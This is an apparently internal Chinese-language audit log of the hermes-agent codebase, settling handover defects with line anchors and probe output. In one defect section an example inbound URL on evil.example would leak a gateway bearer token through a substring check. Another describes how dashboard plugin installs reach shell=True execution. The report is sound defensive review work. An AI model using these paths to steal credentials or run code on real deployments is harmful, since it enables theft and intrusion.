# r11a-90 · 移交条目定案(主线)

> 本卷处置 R11A 名下的前序移交项。溯源约定:`路径:行号 @ 863e313`,锚点单独成行、置于块前。
> 制度要求"逐条给出处置结论,不得只标「续转」了事",所以下面每一条要么给出**可执行的证据**,
> 要么写清**卡在什么地方、需要什么**——没有只写"续转"的格子。

## 0. 一览

| 移交项 | 结论 | 依据 |
|---|---|---|
| **H-R10B-a** 无扩展名锚点 | **结清** | `scripts/verify_citations.py:245`:`EXTLESS_NAMES = frozenset({` + 负控 13 条断言 |
| **H-R10B-g** verify 块配对率 | **结清** | 关卡升格 + 「钉数必配 text 块」写进 CLAUDE.md 与派工书 |
| **H-R9B-g** 惰性安装纪律 | **结清** | `tools/lazy_deps.py:532` 的 `if os.environ.get("HERMES_DISABLE_LAZY_INSTALLS") == "1":`,已入册 |
| **H-R10B-c** L3 排期口径 | **本轮主体二** | 校准片 118 文件 / 17,619 行,见 §L3 与本轮报告 |
| **H-R9C-c** ImportError 吞并 | **证实** | `agent/transports/__init__.py:55` 的 `except ImportError:`,探针实跑 |
| **H-R9D-a** LSP 超时不变式 | **证实,且诊断更准** | `agent/lsp/manager.py:486` 的 `mode=self._wait_mode` |
| **H-R9D-b** 上下文包装器不可并发 | **证实** | `tools/thread_context.py:118` 的 `return ctx.run(_inner)`,实跑抛 RuntimeError |
| **H-R9D-c** 推理标签双路径相反 | **证实** | `agent/think_scrubber.py:89` 的 `_OPEN_TAGS: Tuple[str, ...] = tuple(f"<{name}>" for name in _OPEN_TAG_NAMES)` |
| **H-R9D-d** 托管网关信任闸门 | **证实(两半各自成立但方向不同)** | `tools/managed_tool_gateway.py:298` 的 `(actual.scheme, actual.netloc) == (expected.scheme, expected.netloc)` |
| **H-R9B-d** 中继媒体 bearer | **证实,升为 ■-R11A-01** | `gateway/relay/media.py:94` 的 `return "/relay/media/" in (url or "")` |
| **H-R8D-j** 跑通全套的 extra 集合 | **部分结清 + 新 ▲** | `pyproject.toml:330` 的 `# Removed from [all] on 2026-05-12 (covered by lazy-install):` |
| **H-R9B-e** 缺 extra 表现为断言失败 | **证实,并找到第二例** | `tests/gateway/test_teams.py:173` 的 `assert _teams_mod.check_teams_requirements() is True` |
| **H-R10B-e** e2e 19 个 spec | **阻塞面缩小一半** | `apps/desktop/e2e/fixtures.ts` 与 `e2e/test.ts` 才是启动方 |
| **H-R10-d** 谁能写 plugins 目录 | **答上了定级所需的那一问** | `hermes_cli/web_server.py:16988` 的 `_require_token(request)` |
| **H-R8C-f** import 仅校验 basename | **按原述证伪** | `hermes_cli/backup.py:973` 的 `target.resolve().relative_to(hermes_root.resolve())` |

四条可执行的用探针实跑,输出存 `data/r11a/measurements/handover-defects.txt`:

```verify
cd /home/user/hermes-study && grep -A 5 "^=== summary ===" data/r11a/measurements/handover-defects.txt
```

```text
=== summary ===
  H-R9C-c    CONFIRMED
  H-R9D-b    CONFIRMED
  H-R9D-c    CONFIRMED
  H-R9D-d    CONFIRMED
```

---

## 1. H-R9B-d —— 中继媒体的 bearer 用**子串**决定发给谁(■-R11A-01)

移交项原文:"网关 bearer 的发送判定用子串不比主机,`url` 来自未校验的入站帧;
正确比较值 `self._base_url` 就在同一个类里"。**全部成立**,而且链条比移交项写的更完整。

判定函数只做子串包含:

`gateway/relay/media.py:94 @ 863e313`

```
        return "/relay/media/" in (url or "")
```

它的唯一消费者就是"要不要带 bearer":

`gateway/relay/media.py:164 @ 863e313`

```
        needs_auth = self.is_relay_media_url(url)
```

`gateway/relay/media.py:169 @ 863e313`

```
            headers["Authorization"] = f"Bearer {self._bearer()}"
```

而正确的比较值**就在同一个类的构造里**,同一文件里还被用来拼规范 URL:

`gateway/relay/media.py:80 @ 863e313`

```
        self._base_url = base_url.rstrip("/")
```

> **R11B 更正(就地改正文,按制度写明原判 / 撤因 / 依据)。**
> **原判**:上面这句把「比对 `self._base_url`」写成了修法。
> **为什么撤**:**R9C 已经用本地双服务实验证伪过这条修法**,而本文件全文对
> `302` / 跨源重定向 / `urllib_security` **零命中**——这不是两轮结论之争,
> 是一条已定的案被无意识地写回了旧版本。
> **依据**:`urllib.request.urlopen` 默认跟随 302 **且把 `Authorization` 原样带到新主机**。
> 要害不是比错了值,是**校验发生在错的时刻**:主机校验作用在**发起前**的 URL 上,
> 凭据是在 302 **之后**被带走的,于是主机校验判「通过」而 bearer 照样外泄。
> 正确修法是仓库自带的 `hermes_cli/urllib_security.py` 的 `SafeCredentialRedirectHandler`
> / `open_credentialed_url`(按 origin 归一化比对,跨 origin 时按白名单剥头)。
> **缺陷判定(■-R11A-01)本身不动**,两轮一致;被撤的只有「修法」这一层,且不另立新案号
> ——正确版早在 R9C 已在册。可重跑实证:`data/r11b/probes/relay_media_redirect_probe.py`;
> 全文见 `notes/r11b-92-fix-regression-correction.md`。

**可达性**:`url` 直接来自入站事件的 `media_urls`,逐个丢给 `download()`:

`gateway/relay/adapter.py:474 @ 863e313`

```
                path = await client.download(url)
```

于是一条 `media_urls = ["https://evil.example/relay/media/x"]` 的入站事件,
就让**每网关 bearer 被发到 evil.example**。这是凭据外泄,不是可用性问题。

**搜索面(负结论的成本)**:`grep -rn '"/relay/media/"' --include=*.py .` 全仓,
命中 4 处,去掉 `tests/` 后 3 处 —— 除上面 1 处外,`gateway/relay/adapter.py:471`
与 `:477` 也各自内联了同一个子串判断(它们决定"要不要保留这条 URL",不带凭据)。
**同一个错误形态在非测试代码里被复制了 3 次。**

```verify
cd /home/user/hermes-agent && grep -rn '"/relay/media/"' --include=*.py . | grep -vc "/tests/"
```

```text
3
```

**与 H-R9D-d 的关系**:两者是同一族(信任闸门比错了东西),但**方向相反**——
H-R9D-d 比 `netloc` 太严,失败时**不发**凭据(fail-closed);
H-R9B-d 比子串太松,失败时**发**凭据(fail-open)。所以这一条严重得多。

---

## 2. H-R9D-a —— LSP 外层预算小于内层,但根因不是那行算式

移交项把锚点放在算式上。算式本身没错,**错的是同一个函数的两个调用点传参不一致**。

外层预算:

`agent/lsp/manager.py:313 @ 863e313`

```
            t = max(8.0, self._wait_timeout + 3.0)
```

`_wait_timeout` 默认 5.0(`agent/lsp/manager.py:211` 取 `DIAGNOSTICS_DOCUMENT_WAIT`),
所以 `t = max(8.0, 8.0) = 8.0`。

内层预算由 `wait_for_diagnostics` 决定,而**快照路径没有传 `timeout=`**:

`agent/lsp/manager.py:486 @ 863e313`

```
            fresh = await client.wait_for_diagnostics(file_path, version, mode=self._wait_mode)
```

没传就落到按 mode 取的默认值:

`agent/lsp/client.py:884 @ 863e313`

```
            budget = DIAGNOSTICS_FULL_WAIT if mode == "full" else DIAGNOSTICS_DOCUMENT_WAIT
```

`agent/lsp/client.py:80 @ 863e313`

```
DIAGNOSTICS_FULL_WAIT = 10.0
```

于是 `lsp.wait_mode: full` + 默认 `wait_timeout` ⇒ **外层 8.0s < 内层 10.0s**,
注释自陈的不变式被一个**文档化的配置组合**打破;首次超时即 `_mark_broken_for_file`,
该 (server, root) 从此被跳过。

**对照组**:另一个调用点是传了 `timeout=` 的,所以那条路径不变式成立。

`agent/lsp/manager.py:514 @ 863e313`

```
                file_path, version, mode=self._wait_mode, timeout=self._wait_timeout
```

**所以修法不是把 8.0 调大**,而是让快照路径也把 `self._wait_timeout` 传下去
——两个调用点对同一个函数的用法本来就该一致。这一条**改判了移交项给的定位**。

---

## 3. H-R9D-c —— 带属性的推理标签:两条路径结果相反

流式侧把标签**物化成字面量**,所以 `<think foo="1">` 不匹配任何一个:

`agent/think_scrubber.py:89 @ 863e313`

```
    _OPEN_TAGS: Tuple[str, ...] = tuple(f"<{name}>" for name in _OPEN_TAG_NAMES)
```

非流式侧有两条正则。**闭合对**那条同样不吃属性:

`agent/agent_runtime_helpers.py:59 @ 863e313`

```
    re.compile(rf"<{name}>.*?</{name}>", re.DOTALL | re.IGNORECASE)
```

但**未闭合**那条吃属性(`\b[^>]*>`),而且 `.*$` 配 DOTALL **一路吃到字符串结尾**:

`agent/agent_runtime_helpers.py:79 @ 863e313`

```
    rf'(?:^|\n)[ \t]*<(?:{"|".join(_REASONING_TAG_NAMES)})\b[^>]*>.*$',
```

同一条输入,两条路径实跑结果:

```verify
cd /home/user/hermes-study && sed -n '/^=== H-R9D-c/,/^$/p' data/r11a/measurements/handover-defects.txt | head -7
```

```text
=== H-R9D-c: CONFIRMED ===
    input          : '<think foo="1">SECRET REASONING</think>Hello, user.'
    streaming out  : '<think foo="1">SECRET REASONINGHello, user.'
    non-streaming  : ''
    streaming leaks the reasoning : True
    non-streaming eats the reply  : True
```

流式**原样泄露推理**,非流式**把整条回复吃空**。两个都是错的,而且错法相反
——这正是"两处实现同一件事、没人保证一样"的教科书形态。

---

## 4. H-R9D-d —— 两半都成立,但只有一半是安全问题

`tools/managed_tool_gateway.py:298 @ 863e313`

```
    return bool(actual.scheme) and (actual.scheme, actual.netloc) == (expected.scheme, expected.netloc)
```

**(a) 大小写敏感**:`netloc` 不做小写归一(`hostname` 才做)。实测同一主机大写后
判定为 **False** —— 即**失败方向是不发凭据**(fail-closed)。是功能缺陷,不是安全漏洞。

**(b) 明文**:`TOOL_GATEWAY_SCHEME=http` 被显式接受:

`tools/managed_tool_gateway.py:153 @ 863e313`

```
    if scheme in {"http", "https"}:
```

于是 expected 与 actual **一起**变成 `http://`,判定为 **True**,Nous bearer 走明文。
这一半是真的安全问题。

*本条的探针自己错过一次,记在这里*:初版硬写 vendor 为 `"nous"`,得到 False,
看起来像"移交项不成立";实际模块的 `_MANAGED_GATEWAY_VENDOR` 是 `tool`,
`nous-gateway.…` 本来就是**另一个主机**,被拒是**对的**。
**一个打偏了的负控会让人把真缺陷判成不存在**,所以探针改为读模块自己的常量。

---

## 5. H-R9C-c —— 分不清"包没装"和"我们自己的 import 有 bug"

`agent/transports/__init__.py:55 @ 863e313`

```
    except ImportError:
```

同形状的 `except ImportError:` 在该模块共 4 处,**没有任何一处看 `exc.name`**。
探针分别注入两种失败(缺可选包 / 自己模块里的拼错 import),
`_discover_transports()` 对两者**都静默吞掉**,`get_transport()` 之后一律返回 `None`。

```verify
cd /home/user/hermes-agent && grep -c "except ImportError:" agent/transports/__init__.py
```

```text
4
```

---

## 6. H-R8D-j + H-R9B-e —— extra 集合,以及一条新的 ▲

### 6.1 收集期就挂掉的,只有两族

全量收集(26,112 个用例)只有 12 个文件在收集期失败:

```verify
cd /home/user/hermes-agent && HERMES_DISABLE_LAZY_INSTALLS=1 /home/user/hermes-venv/bin/python -m pytest tests/acp tests/acp_adapter tests/gateway/test_teams.py --collect-only -q 2>&1 | grep -cE "^E   ModuleNotFoundError: No module named 'acp'"
```

```text
11
```

11 个是 `acp` extra;第 12 个**不是** ImportError,而是**模块级断言**:

`tests/gateway/test_teams.py:173 @ 863e313`

```
assert _teams_mod.check_teams_requirements() is True
```

这正是 **H-R9B-e** 说的那个更隐蔽的形态(缺 extra 表现为普通断言失败),
而且它是**第二例**——H-R9B-e 立项时举的是 `fal`。**证实,并且不是孤例。**

### 6.2 ▲-R11A-01:`[all]` 不是 all,而 README 给的理由已经过时

`[all]` 递归展开后只含 **11** 个 extra(含它自己),仓库共定义 **45** 个:

```verify
cd /home/user/hermes-agent && python3 -c "
import tomllib,re
opt=tomllib.load(open('pyproject.toml','rb'))['project']['optional-dependencies']
S=re.compile(r'^hermes-agent\[([a-z0-9,_-]+)\]\$',re.I)
def ex(n,seen=None):
    seen=seen or set()
    if n in seen: return set()
    seen.add(n); out={n}
    for d in opt.get(n,[]):
        m=S.match(d.strip())
        if m:
            for s in m.group(1).split(','): out|=ex(s.strip(),seen)
    return out
print(len(ex('all')), len(opt))"
```

```text
11 45
```

pyproject 自己把移出 `[all]` 的清单写得很清楚,**`voice` 在列**:

`pyproject.toml:330 @ 863e313`

```
  # Removed from [all] on 2026-05-12 (covered by lazy-install):
  #   anthropic, exa, firecrawl, parallel-web, fal, edge-tts,
  #   modal, daytona, vercel, messaging (telegram/discord/slack),
  #   matrix, slack, honcho, voice (faster-whisper),
  #   dingtalk, feishu, bedrock, tts-premium (elevenlabs)
```

而 README 仍把"`.[all]` 会拉进 Android 不兼容的**语音**依赖"当作现状理由:

`README.md:57 @ 863e313`

> > **Android / Termux:** The tested manual path is documented in the [Termux guide](https://hermes-agent.nousresearch.com/docs/getting-started/termux). On Termux, Hermes installs a curated `.[termux]` extra because the full `.[all]` extra currently pulls Android-incompatible voice dependencies.

按制度要**整句判定**:前半句(Termux 上装 `.[termux]`)**成立**(`pyproject.toml:270` 有 `termux`);
后半句给的**理由**已被 2026-05-12 那次改动作废,而 "currently" 使它是一句现状断言,不是历史。
**半句真、半句过时**——正是 CLAUDE.md 点名要防的那种形态。同一句话在
`README.es.md:57`、`README.zh-CN.md:40`、`README.ur-pk.md:64` 三份译本里各有一份。

### 6.3 还差什么才算完全结清

H-R8D-j 要的是"跑通全套所需的 extra 集合,并写进 CLAUDE.md"。本轮**给出了收集期的答案**
(`acp` + `teams`),但**没有给运行期的完整集合**,因为那需要真装一遍再全量跑。
本轮**故意没装**:三个子代理在跑,而制度规定子代理运行期间不扩充共享环境;
装了就会让本轮"开工 87 / 收工 87"这个读数失去意义。
**这是有意的取舍,不是遗漏**;需要的动作写在报告的"待提供 / 下轮"里。

---

## 7. H-R10B-e —— 阻塞面比移交项写的小一半

移交项写"需 Electron 二进制 **+ 浏览器**"。本容器里**浏览器是有的**:

```verify
find /opt/pw-browsers -maxdepth 4 -type f -name chrome | wc -l
```

```text
1
```

*这条命令自己被关卡抓过一次*:初版写的是 `ls /opt/pw-browsers/ | grep -c chromium`,
我照眼睛数填了 `2`,实际是 `3`(`chromium`、`chromium-1194`、`chromium_headless_shell-1194`)。
数目录名本来也证不出"浏览器可用",所以改成**直接断言可执行文件在**。
**这是本轮升格后的关卡在当轮自己身上抓到的第一处。**

缺的只有 Electron 二进制,而拿到它要 `npm install`(本轮共享环境纪律禁止)。
19 个 spec 里只有 2 个直接提到 electron,但它们**全部**经由启动夹具:
`apps/desktop/e2e/test.ts`(15 个 spec 引用)与 `apps/desktop/e2e/fixtures.ts`(4 个),
两者都是 Electron 启动方。所以**19 个一个也跑不了**,但**理由只剩一个**。

---

## 8. H-R10-d —— 定级所缺的那一问已经答上

移交项说"需重验『谁能写 `$HERMES_HOME/plugins/`』才能定级"。答案:
**本机用户,加上任何一个通过鉴权的 dashboard 会话。** 写入端点带鉴权:

`hermes_cli/web_server.py:16988 @ 863e313`

```
    _require_token(request)
```

它把 `identifier` 交给 `dashboard_install_plugin`,后者按 git URL 装进插件目录;
随后 manifest 的 `install` 字段以 `shell=True` 执行(移交项锚点 `hermes_cli/web_server.py:5524`)。

**定级**:不是未鉴权 RCE(端点两种鉴权模式都要过),但**dashboard 凭据 ≡ 宿主机 shell**。
这不是一个"只读状态页"该有的权重,也让 R8C / R8D 关于 token 暴露面的问题成为**定级前提**。
本轮把这一问答上,严重度仍随 token 暴露面走,**留给覆盖 dashboard 的轮次合并定案**。

---

## 9. H-R8C-f —— 按原述证伪

原述是"来源校验仅 basename"。实际:import 解包对**每一个成员**先解析再判归属,
两条分支各有一次,越界即拒:

`hermes_cli/backup.py:973 @ 863e313`

```
                target.resolve().relative_to(hermes_root.resolve())
```

`hermes_cli/backup.py:928 @ 863e313`

```
                    target.resolve().relative_to(home_dir)
```

按 basename 匹配的是**另一件事**——"永不覆盖"名单,而且那是**刻意**的,
文件里自己写明理由(要同时罩住根 profile 与命名 profile)。
所以"仅 basename"这个描述把两个机制混成了一个。**该条按原述不成立。**

---

## 10. 移交(带声明式锚点)

| 移交项 | 去向 | 锚点 | 现象 |
|---|---|---|---|
| **H-R11A-a** | R11B | `gateway/relay/media.py:94`:`return "/relay/media/" in (url or "")` | ■-R11A-01:子串判定让入站 URL 把每网关 bearer 引到任意主机;同形态在 `gateway/relay/adapter.py:471` / `:477` 另有 2 处 |
| **H-R11A-b** | R11B | `agent/lsp/manager.py:486`:`fresh = await client.wait_for_diagnostics(file_path, version, mode=self._wait_mode)` | 快照路径漏传 `timeout=`,与 `:514` 同函数用法不一致;修法是补传,不是调大 `:313` 的 8.0 |
| **H-R11A-c** | R11 复盘 | `pyproject.toml:330`:`# Removed from [all] on 2026-05-12 (covered by lazy-install):` | ▲-R11A-01:四份 README 仍以"`[all]` 拉语音依赖"为由解释 Termux 特例,该理由已作废 |
| **H-R11A-d** | 需装 extra 的轮次 | `tests/gateway/test_teams.py:173`:`assert _teams_mod.check_teams_requirements() is True` | H-R8D-j 的运行期集合仍未确定;要真装一遍全量跑,本轮为守共享环境纪律有意未做 |
| **H-R11A-e** | R11 复盘 | `scripts/verify_evidence_commands.py:46`:`TIMEOUT = 900` | 关卡不捕 `subprocess.TimeoutExpired`,一条超时命令会让整轮扫描**中途崩掉**,其后文件一个没查;本轮靠 `data/r11a/probes/evidence_backlog_sweep.sh` 逐文件外部限时绕开 |
| **H-R11A-f** | 接手 `plugins/` 的那一轮 | `scripts/assign_layers.py:612`:`("plugins/**", "L2", "R6"),` | `round=R6` 名下另有 243 个 L2 文件 / 116,078 行 `status` 从未动过,与本轮修掉的 L3 侧同形态;本轮**有意未改**——它分散在一条兜底规则与两条显式点名规则之间,只改兜底会留 16 个不一致,而"显式点名却没做"与"兜底桶没人认领"是两种不同的失败 |
| **H-R11A-g** | R11 复盘 | `data/r11a/dispatch-brief.md:71` 的 `**R11A 新增**:无扩展名文件也能当锚点了` | 派工书说 `scripts/hermes-gateway` 不受引用校验保护,**说错了**:它在 `EXTLESS_NAMES` 名单里且路径含 `/`,实测受保护;真正不受保护的是 `.ps1` / `.cmd`。片 A 自己发现并纠正,但派工书是下一轮会复制的模板 |
